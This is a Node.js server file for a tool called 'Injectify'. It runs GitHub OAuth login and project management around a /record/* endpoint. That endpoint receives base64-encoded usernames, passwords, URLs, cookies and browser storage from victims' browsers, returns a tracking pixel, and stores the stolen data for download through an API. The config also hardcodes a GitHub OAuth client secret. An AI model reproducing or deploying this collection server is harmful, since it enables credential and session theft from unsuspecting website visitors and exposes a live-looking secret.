// Configuration
const config = {
	debug 	: false,
	mongodb : 'mongodb://localhost:19000/injectify',
	express : 3000,
	dev		: process.env.NODE_ENV.toUpperCase() == 'DEVELOPMENT',
	github  : {
		client_id: '95dfa766d1ceda2d163d',
		client_secret: '1809473ac6467f85f483c33c1098d4dadf8be9e8'
	}
}

// Include libraries
const MongoClient 	= require('mongodb').MongoClient
const express 		= require('express')
const app 	 		= express()
const server 		= app.listen(config.express)
const io 			= require('socket.io').listen(server)
const path 			= require('path')
const request 		= require('request')
const {URL}			= require('url')
const chalk 		= require('chalk')

console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)

MongoClient.connect(config.mongodb, function(err, db) {
	if (err) throw err
	function getIP(ip) {
		if (ip == "::1" || ip == "::ffff:127.0.0.1")
			return "127.0.0.1"
		else
			return ip
	}
	io.on('connection', socket => {
		let globalToken,
			refresh
		var getToken = code => {
			return new Promise((resolve, reject) => {
				request({
						url: 'https://github.com/login/oauth/access_token',
						method: 'POST',
						headers: {
							'Accept': 'application/json'
						},
						qs: {
							'client_id': config.github.client_id,
							'client_secret': config.github.client_secret,
							'code': code
						}
					}, (error, response, github) => {
						try {
							github = JSON.parse(github)
						} catch(e) {
							console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve token "), github);
							console.error(e)
							reject(Error("Failed to parse GitHub response"))
						}
						if (!error && response.statusCode == 200 && github.access_token) {
							resolve(github.access_token)
						} else {
							reject(Error("Failed to authenticate account, invalid code"))
						}
					}
				)
			})
		}
		var getUser = token => {
			return new Promise((resolve, reject) => {
				request({
					url: 'https://api.github.com/user?access_token=' + token,
					method: 'GET',
					headers: {
						'Accept': 'application/json',
						'User-Agent': 'Injectify'
					}
				}, (error, response, user) => {
					try {
						user = JSON.parse(user)
					} catch(e) {
						console.log(chalk.redBright("[websocket] ") + chalk.yellowBright("failed to retrieve user API "), user);
						console.error(e)
						reject({
							title	: "Could not authenticate you",
							message	: "Failed to parse the GitHub user API response"
						})
					}
					if (!error && response.statusCode == 200 && user.login) {
						resolve(user)
					} else {
						reject({
							title	: "Could not authenticate you",
							message	: "GitHub API rejected token!"
						})
					}
				})
			})
		}
		var database = (user) => {
			return new Promise((resolve, reject) => {
				db.collection('users', (err, users) => {
					if (err) throw err
					users.findOne({id: user.id}).then(doc => {
						resolve(doc)
					})
				})
			})
		}
		var login = (user, token, loginMethod) => {
			return new Promise((resolve, reject) => {
				db.collection('users', (err, users) => {
					if (err) throw err
					users.findOne({id: user.id}).then(doc => {
						if(doc !== null) {
							// User exists in database
							users.updateOne({
								id: user.id
							},
							{
								$set: {
									username: user.login,
									github: user // Update the GitHub object with latest values
								},
								$push: {
									logins: {
										time		: Math.round(new Date().getTime() / 1000),
										ip			: getIP(socket.handshake.address),
										token		: token,
										login_type	: loginMethod
									}
								}
							}).then(() => {
								resolve()
							})
						} else {
							// User doesn't exist in database
							users.insertOne({
								username	: user.login,
								id			: user.id,
								payment		: {
									account_type	: "free",
									method			: "none"
								},
								logins		: [{
									time		: Math.round(new Date().getTime() / 1000),
									ip			: getIP(socket.handshake.address),
									token		: token,
									login_type	: loginMethod
								}],
								github		: user
							}, (err, res) => {
								if (err) {
									reject(Error(err))
									throw err
								} else {
									console.log(
										chalk.greenBright("[database] ") + 
										chalk.yellowBright("added user ") + 
										chalk.magentaBright(user.id) + 
										chalk.cyanBright(" (" + user.login + ")")
									)
									resolve()
								}
							})
						}
					})
				})
			})
		}
		var newProject = (project, user) => {
			return new Promise((resolve, reject) => {
				db.collection('projects', (err, projects) => {
					if (err) throw err
					projects.findOne({name: project}).then(doc => {
						if(doc == null) {
							// Project doesn't exist in database
							projects.insertOne({
								name		: project,
								permissions : {
									owners	: [user.id],
									admins	: [],
									readonly: []
								},
								config		: {
									filter		: {
										type	: "whitelist",
										domains	: []
									},
									created_at	: Math.round(new Date().getTime() / 1000)
								},
								records		: []
							}, (err, res) => {
								if (err) {
									throw err
								} else {
									console.log(
										chalk.greenBright("[database] ") + 
										chalk.magentaBright(user.id) + 
										chalk.cyanBright(" (" + user.login + ") ") + 
										chalk.yellowBright("added project ") + 
										chalk.magentaBright(project)
									)
									resolve()
								}
							});
						} else {
							// Project already exists
							console.log(
								chalk.redBright("[database] ") + 
								chalk.yellowBright("project ") +
								chalk.magentaBright(project) +
								chalk.yellowBright(" already exists ")
							)
							reject({
								title	: "Project name already taken",
								message	: "Please choose another name"
							})
						}
					})
				})
			})
		}
		var getProjects = user => {
			return new Promise((resolve, reject) => {
				db.collection('projects', (err, projects) => {
					if (err) throw err
					let projectsWithAccess = []
					projects.find({
						$or: [
							{"permissions.owners": user.id},
							{"permissions.admins": user.id},
							{"permissions.readonly": user.id}
						]
					}).sort({name: 1}).forEach(doc => {
						if(doc !== null) {
							projectsWithAccess.push({
								name		: doc.name,
								permissions	: doc.permissions
							})
						}
					}, error => {
						if (error) throw error
						if (projectsWithAccess.length > 0) {
							resolve(projectsWithAccess)
						} else {
							reject("no projects saved for user" + user.id)
						}
					})
				})
			})
		}
		var getProject = (name, user) => {
			return new Promise((resolve, reject) => {
				db.collection('projects', (err, projects) => {
					if (err) throw err
					let projectsWithAccess = []
					projects.findOne({
						$or: [
							{"permissions.owners": user.id},
							{"permissions.admins": user.id},
							{"permissions.readonly": user.id}
						],
						$and: [
							{"name": name}
						]
					}).then(doc => {
						if(doc !== null) {
							resolve(doc)
						} else {
							reject({
								title: "Access denied",
								message: "You don't have permission to access project " + name
							})
						}
					})
				})
			})
		}

		socket.on('auth:github', data => {
			if (data.code) {
				if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client => github:auth "), data);
				// Convert the code into a user-token
				getToken(data.code).then(token => {
					if (config.debug) console.log(chalk.greenBright("[GitHub] ") + chalk.yellowBright("retrieved token "), token);
					// Convert the token into a user object
					getUser(token).then(user => {
						globalToken = token
						socket.emit('auth:github', {
							success: true,
							token: token,
							user: user
						})
						if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client <= github:auth "), user);
						// Add the user to the database if they don't exist
						login(user, token, "manual").then(() => {
							getProjects(user).then(projects => {
								socket.emit('user:projects', projects)
							}).catch(error => {
								if (config.debug) console.log(chalk.redBright("[database] "), error)
							})
						}).catch(error => {
							console.log(chalk.redBright("[database] "), error);
							socket.emit('database:registration', {
								success: false,
								message: error.toString()
							})
						})
					}).catch(error => {
						console.log(chalk.redBright("[auth:github] "), error.message);
						socket.emit('err', {
							title	: error.title.toString(),
							message	: error.message.toString()
						})
					})
				}).catch(error => {
					console.log(chalk.redBright("[auth:github] "), error.message);
					socket.emit('err', {
						title	: error.title.toString(),
						message	: error.message.toString()
					})
				})
			}
		})

		socket.on('auth:github/token', token => {
			if (token) {
				// Convert the token into a user object
				getUser(token).then(user => {
					globalToken = token
					socket.emit('auth:github', {
						success: true,
						token: token,
						user: user
					})
					if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client <= github:auth "), user);
					// Add the user to the database if they don't exist
					login(user, token, "automatic").then(() => {
						getProjects(user).then(projects => {
							socket.emit('user:projects', projects)
						}).catch(error => {
							if (config.debug) console.log(chalk.redBright("[database] "), error)
						})
					}).catch(error => {
						console.log(chalk.redBright("[database] "), error);
						socket.emit('database:registration', {
							success: false,
							message: error.toString()
						})
					})
				}).catch(error => {
					// Signal the user to re-authenticate their GitHub account
					console.log(chalk.redBright("[auth:github/token] "), error.message)
					socket.emit('auth:github/stale', {
						title	: error.title.toString(),
						message	: error.message.toString()
					})
				})
			}
		})

		socket.on('project:create', project => {
			if (project.name && globalToken) {
				getUser(globalToken).then(user => {
					newProject(project.name, user).then(value => {
						socket.emit('project:create', {
							success	: true,
							project : project.name
						})
						getProjects(user).then(projects => {
							socket.emit('user:projects', projects)
						}).catch(error => {
							if (config.debug) console.log(chalk.redBright("[database] "), error)
						})
					}).catch(e => {
						socket.emit('err', {
							title	: e.title,
							message	: e.message
						})
					})
				}).catch(error => {
					// Failed to authenticate user with token
					console.log(chalk.redBright("[project:create] "), error.message);
					socket.emit('err', {
						title	: error.title.toString(),
						message	: error.message.toString()
					})
				})
			} else {
				socket.emit('err', {
					title	: "Access denied",
					message	: "You need to be authenticated first!"
				})
			}
		})

		socket.on('project:read', project => {
			if (project.name && globalToken) {
				getUser(globalToken).then(user => {
					getProject(project.name, user).then(thisProject => {
						socket.emit('project:read', thisProject)
					}).catch(e => {
						socket.emit('err', {
							title	: e.title,
							message	: e.message
						})
					})
					database(user).then(doc => {
						if (doc.payment.account_type.toLowerCase() != "free") {
							clearInterval(refresh)
							refresh = setInterval(() => {
								getProject(project.name, user).then(thisProject => {
									socket.emit('project:read', thisProject)
								}).catch(e => {
									socket.emit('err', {
										title	: e.title,
										message	: e.message
									})
								})
							}, 5000)
						}
					})
				}).catch(error => {
					// Failed to authenticate user with token
					console.log(chalk.redBright("[project:read] "), error.message);
					socket.emit('err', {
						title	: error.title.toString(),
						message	: error.message.toString()
					})
				})
			} else {
				socket.emit('err', {
					title	: "Access denied",
					message	: "You need to be authenticated first!"
				})
			}
		})

		socket.on('project:close', project => {
			clearInterval(refresh)
		})
	})

	app.get('/auth/github', (req, res) => {
		if (req.query.code) {
			res.sendFile(__dirname + '/www/auth.html')
		} else {
			res.set('Content-Type', 'application/json')
			res.send(JSON.stringify({
				success: false,
				message: "No authorization token specified in request"
			}))
		}
	})

	app.get('/record/*', (req, res) => {
		var validate = base64 => {
			return new Promise((resolve, reject) => {
				if (typeof base64 === "string") {
					try {
						let json = JSON.parse(Buffer.from(base64, 'base64').toString())
						if (json) resolve(json)
					} catch (e) {
						reject(Error("invalid base64 encoded json string (" + e + ")"))
					}
				} else {
					reject(Error("empty request path"))
				}
			})
		}
		var Record = record => {
			return new Promise((resolve, reject) => {
				let project			= "a",
					username		= "b",
					password		= "c",
					url				= "d",
					width			= "e",
					height			= "f",
					localStorage	= "g",
					sessionStorage	= "h",
					cookies			= "i"
				if (record[project]) {
					db.collection('projects', (err, projects) => {
						if (err) throw err
						projects.findOne({name: record[project]}).then(doc => {
							if(doc !== null) {
								if (req.header('Referer') && doc.config.filter.domains.length > 0) {
									let referer = new URL(req.header('Referer')),
										allowed
									if (doc.config.filter.type.toLowerCase() == "whitelist")
										allowed = false
									else
										allowed = true
									doc.config.filter.domains.forEach(domain => {
										domain = new URL(domain)
										if (doc.config.filter.type.toLowerCase() == "whitelist") {
											// Whitelist
											if (domain.host == referer.host) allowed = true
										} else {
											// Blacklist
											if (domain.host == referer.host) allowed = false
										}
									})
									if (!allowed) {
										if (doc.config.filter.type.toLowerCase() == "whitelist")
											reject("domain hasn't been whitelisted, not recording")
										else
											reject("domain has been blacklisted, not recording")
										return
									}
								}
								try {
									var ip = req.headers['x-forwarded-for'].split(',')[0]
								} catch(e) {
									var ip = getIP(req.connection.remoteAddress)
								}
								projects.updateOne({
									name: record[project]
								},
								{
									$push: {
										records: {
											timestamp	: Math.round(new Date().getTime() / 1000),
											username	: record[username],
											password	: record[password],
											url			: record[url],
											ip			: ip,
											browser: {
												width	: record[width],
												height	: record[height],
												headers	: req.headers
											},
											storage : {
												local	: record[localStorage],
												session	: record[sessionStorage],
												cookies	: record[cookies]
											}
										}
									}
								}).then(() => {
									resolve("wrote record to database")
								})
							} else {
								reject("project " + record[project] + " doesn't exist")
							}
						})
					})
				}
			})
		}
		// Send a 1x1px gif
		let data = [
			0x47,0x49, 0x46,0x38, 0x39,0x61, 0x01,0x00, 0x01,0x00, 0x80,0x00, 0x00,0xFF, 0xFF,0xFF,
			0x00,0x00, 0x00,0x21, 0xf9,0x04, 0x04,0x00, 0x00,0x00, 0x00,0x2c, 0x00,0x00, 0x00,0x00,
			0x01,0x00, 0x01,0x00, 0x00,0x02, 0x02,0x44, 0x01,0x00, 0x3b
		]
		res.set('Content-Type', 'image/gif')
		   .set('Content-Length', data.length)
		   .status(200)
		   .send(new Buffer(data))

		validate(req.path.substring(1).split(/\/(.+)?/, 2)[1]).then(record => {
			Record(record).then(message => {
				if (config.debug) console.log(
					chalk.greenBright("[record] ") + 
					chalk.yellowBright(message)
				)
			}).catch(error => {
				if (config.debug) console.log(
					chalk.redBright("[record] ") + 
					chalk.yellowBright(error)
				)
			})
		}).catch(error => {
			if (config.debug) console.log(chalk.redBright("[record] ") + chalk.yellowBright(error));
		})
	})

	app.get('/api/*', (req, res) => {
		var getAPI = (name, token) => {
			return new Promise((resolve, reject) => {
				request({
					url: 'https://api.github.com/user?access_token=' + token,
					method: 'GET',
					headers: {
						'Accept': 'application/json',
						'User-Agent': 'Injectify'
					}
				}, (error, response, user) => {
					try {
						user = JSON.parse(user)
					} catch(e) {
						console.error(e)
						reject({
							title	: "Could not authenticate you",
							message	: "Failed to parse the GitHub user API response"
						})
					}
					if (!error && response.statusCode == 200 && user.login) {
						db.collection('projects', (err, projects) => {
							if (err) throw err
							let projectsWithAccess = []
							projects.findOne({
								$or: [
									{"permissions.owners": user.id},
									{"permissions.admins": user.id},
									{"permissions.readonly": user.id}
								],
								$and: [
									{"name": name}
								]
							}).then(doc => {
								if(doc !== null) {
									resolve(doc)
									return
								} else {
									reject({
										title: "Access denied",
										message: "You don't have permission to access project " + name
									})
								}
							})
						})
					} else {
						reject({
							title	: "Could not authenticate you",
							message	: "GitHub API rejected token!"
						})
					}
				})
			})
		}
		let array = req.path.substring(5).split('/'),
			url = array.splice(0,1)
		url.push(array.join('/'))

		let token = decodeURIComponent(url[0])
		let project = decodeURIComponent(url[1])
		if (req.path.toLowerCase().endsWith("&download=true")) project = project.slice(0, -14)

		if (project && token) {
			getAPI(project, token).then(json => {
				if (req.path.toLowerCase().endsWith("&download=true")) {
					res.setHeader('Content-Type', 'application/octet-stream')
					res.setHeader('Content-Disposition', 'filename="injectify_project_[' + json.name + '].json"')
				} else {
					res.setHeader('Content-Type', 'application/json')
				}
				json = JSON.stringify(json.records, null, "\t")
				res.send(json)
				console.log(
					chalk.greenBright("[API] ") +
					chalk.yellowBright("delivered ") +
					chalk.magentaBright(project) +
					chalk.redBright(" (length=" + json.length + ")")
				)
			}).catch(error => {
				res.setHeader('Content-Type', 'application/json')
				res.send(JSON.stringify(error, null, "\t"))
			})
		} else if (token) {
			res.setHeader('Content-Type', 'application/json')
			res.send(JSON.stringify({
				title: "Bad request",
				message: "Specify a project name to return in request",
				format: "https://injectify.samdd.me/api/" + token + "/PROJECT_NAME"
			}, null, "\t"))
		} else {
			res.setHeader('Content-Type', 'application/json')
			res.send(JSON.stringify({
				title: "Bad request",
				message: "Specify a token & project name to return in request",
				format: "https://injectify.samdd.me/api/GITHUB_TOKEN/PROJECT_NAME"
			}, null, "\t"))
		}
	})

	if (config.dev) {
		app.use('/assets/main.css', (req, res) => {
			res.sendFile(path.join(__dirname, '/../../output/site/assets/main.css'))
		})
		// Proxy through to webpack-dev-server if in development mode
		app.use('/*', (req, res) => {
			request("http://localhost:8080" + req.originalUrl).pipe(res);
		})
	} else {
		app.use(express.static(path.join(__dirname, '../../output/site')))
	}
})